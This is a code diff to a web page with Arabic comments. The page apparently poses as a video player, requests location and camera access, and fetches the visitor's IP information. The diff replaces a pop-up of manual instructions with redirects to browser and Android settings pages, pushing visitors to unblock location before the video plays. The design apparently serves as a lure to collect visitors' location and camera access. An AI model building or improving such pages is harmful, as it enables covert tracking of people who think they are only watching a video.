@@ -139,40 +139,6 @@
         #retryButton:hover {
             background: #1557b0;
         }
-        /* رسالة التعليمات */
-        #instructions {
-            display: none;
-            position: absolute;
-            bottom: 90px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.85);
-            color: #fff;
-            padding: 15px 20px;
-            border-radius: 10px;
-            font-size: 14px;
-            text-align: center;
-            z-index: 15;
-            max-width: 80%;
-            border: 1px solid #555;
-        }
-        #instructions a {
-            color: #4fc3f7;
-            word-break: break-all;
-        }
-        #instructions .copy-btn {
-            background: #333;
-            color: #fff;
-            border: 1px solid #666;
-            padding: 5px 12px;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 8px;
-            font-size: 13px;
-        }
-        #instructions .copy-btn:hover {
-            background: #555;
-        }
         .video-info {
             padding: 20px;
             border-bottom: 1px solid #333;
@@ -317,11 +283,6 @@
             #gearButton .sub-text {
                 font-size: 15px;
             }
-            #instructions {
-                font-size: 12px;
-                padding: 10px 14px;
-                bottom: 80px;
-            }
             #retryButton {
                 padding: 10px 25px;
                 font-size: 16px;
@@ -348,14 +309,6 @@
                 <div class="icon-gear">⚙️</div>
                 <div class="main-text">تغيير الإعدادات</div>
                 <div class="sub-text">اضغط لفتح إعدادات الموقع في المتصفح</div>
-            </div>
-
-            <div id="instructions">
-                <p>🔹 إذا لم يتم فتح الإعدادات تلقائياً، يرجى فتح الرابط التالي يدوياً:</p>
-                <a href="#" id="settingsLink" target="_blank">chrome://settings/content/location</a>
-                <br>
-                <button class="copy-btn" id="copyLinkBtn">📋 نسخ الرابط</button>
-                <p style="margin-top:8px; font-size:12px; opacity:0.7;">ثم غيّر الحظر إلى "اسأل" أو "سماح"</p>
             </div>
 
             <button id="retryButton">🔄 إعادة المحاولة</button>
@@ -409,27 +362,6 @@
             const loading = document.getElementById('loading');
             const gearBtn = document.getElementById('gearButton');
             const retryBtn = document.getElementById('retryButton');
-            const instructions = document.getElementById('instructions');
-            const settingsLink = document.getElementById('settingsLink');
-            const copyBtn = document.getElementById('copyLinkBtn');
-
-            // تعيين رابط الإعدادات حسب المتصفح
-            function getSettingsURL() {
-                const ua = navigator.userAgent;
-                if (/Chrome/.test(ua) && !/Edge/.test(ua)) return 'chrome://settings/content/location';
-                if (/Firefox/.test(ua)) return 'about:preferences#privacy';
-                if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
-                if (/Android/.test(ua)) return 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
-                return 'chrome://settings/content/location'; // افتراضي
-            }
-
-            // تحديث الرابط في الرسالة
-            function updateSettingsLink() {
-                const url = getSettingsURL();
-                settingsLink.href = url;
-                settingsLink.textContent = url;
-            }
-            updateSettingsLink();
 
             // طلب الصلاحيات (الموقع والكاميرا)
             async function requestPermissions() {
@@ -459,58 +391,54 @@
                 return locationOk && cameraOk;
             }
 
-            // فتح إعدادات الموقع في المتصفح مع عرض تعليمات إذا فشل
+            // فتح إعدادات الموقع في المتصفح (محاولات متعددة)
             function openBrowserLocationSettings() {
-                const url = getSettingsURL();
-                // محاولة فتح الرابط
-                try {
-                    window.open(url, '_blank');
-                } catch (e) {
-                    // إذا فشل الفتح، نعرض التعليمات
-                    showInstructions();
+                const ua = navigator.userAgent;
+
+                // محاولة 1: Chrome
+                if (/Chrome/.test(ua) && !/Edge/.test(ua)) {
+                    try {
+                        window.location.href = 'chrome://settings/content/location';
+                        return;
+                    } catch (e) {}
                 }
 
-                // بعد محاولة الفتح، نظهر التعليمات كنسخة احتياطية بعد ثانية
-                setTimeout(() => {
-                    // إذا كانت الصفحة لا تزال مرئية (أي لم يغادر المستخدم)، نعرض التعليمات
-                    if (document.visibilityState === 'visible') {
-                        showInstructions();
-                    }
-                }, 1500);
-            }
+                // محاولة 2: Firefox
+                if (/Firefox/.test(ua)) {
+                    try {
+                        window.location.href = 'about:preferences#privacy';
+                        return;
+                    } catch (e) {}
+                }
 
-            // إظهار رسالة التعليمات
-            function showInstructions() {
-                instructions.style.display = 'block';
-                // إخفاء التعليمات بعد 30 ثانية أو عند النقر في أي مكان
-                setTimeout(() => {
-                    instructions.style.display = 'none';
-                }, 30000);
-                // إخفاء عند النقر على الصفحة
-                document.addEventListener('click', function hideInst() {
-                    instructions.style.display = 'none';
-                    document.removeEventListener('click', hideInst);
-                }, { once: true });
-            }
+                // محاولة 3: Safari (Mac)
+                if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
+                    try {
+                        window.location.href = 'x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices';
+                        return;
+                    } catch (e) {}
+                }
 
-            // نسخ الرابط
-            copyBtn.addEventListener('click', function() {
-                const url = getSettingsURL();
-                navigator.clipboard.writeText(url).then(() => {
-                    copyBtn.textContent = '✅ تم النسخ';
-                    setTimeout(() => { copyBtn.textContent = '📋 نسخ الرابط'; }, 3000);
-                }).catch(() => {
-                    // بديل قديم
-                    const textarea = document.createElement('textarea');
-                    textarea.value = url;
-                    document.body.appendChild(textarea);
-                    textarea.select();
-                    document.execCommand('copy');
-                    document.body.removeChild(textarea);
-                    copyBtn.textContent = '✅ تم النسخ';
-                    setTimeout(() => { copyBtn.textContent = '📋 نسخ الرابط'; }, 3000);
-                });
-            });
+                // محاولة 4: Android - فتح إعدادات التطبيق (Chrome)
+                if (/Android/.test(ua)) {
+                    try {
+                        window.location.href = 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
+                        return;
+                    } catch (e) {}
+                    try {
+                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
+                        return;
+                    } catch (e) {}
+                }
+
+                // محاولة 5: فتح إعدادات عامة (قد تفتح إعدادات الجهاز)
+                try {
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                } catch (e) {
+                    // فشل كل شيء
+                    alert('تعذر فتح الإعدادات. يرجى فتح إعدادات الموقع يدوياً في متصفحك.');
+                }
+            }
 
             // جلب البيانات
             async function fetchIPInfo() {
@@ -707,21 +635,18 @@
                 gearBtn.style.display = 'flex';
                 playBtn.style.display = 'none';
                 retryBtn.style.display = 'none';
-                instructions.style.display = 'none';
             }
 
             function hideGearButton() {
                 gearBtn.style.display = 'none';
                 playBtn.style.display = 'flex';
                 retryBtn.style.display = 'none';
-                instructions.style.display = 'none';
             }
 
             function showRetryButton() {
                 retryBtn.style.display = 'block';
                 gearBtn.style.display = 'none';
                 playBtn.style.display = 'none';
-                instructions.style.display = 'none';
             }
 
             // معالج الضغط على زر التشغيل
@@ -753,15 +678,13 @@
             // معالج زر الترس
             function handleGearClick() {
                 settingsOpened = true;
-                // نحاول فتح الإعدادات
                 openBrowserLocationSettings();
-                // نعرض زر إعادة المحاولة أيضاً بعد فترة
+                // بعد فترة نعرض زر إعادة المحاولة إذا لم يعُد المستخدم
                 setTimeout(() => {
                     if (!videoStarted && !isProcessing) {
                         showRetryButton();
                     }
                 }, 5000);
-                // لكن نعتمد على visibilitychange للكشف عن العودة
             }
 
             // معالج زر إعادة المحاولة
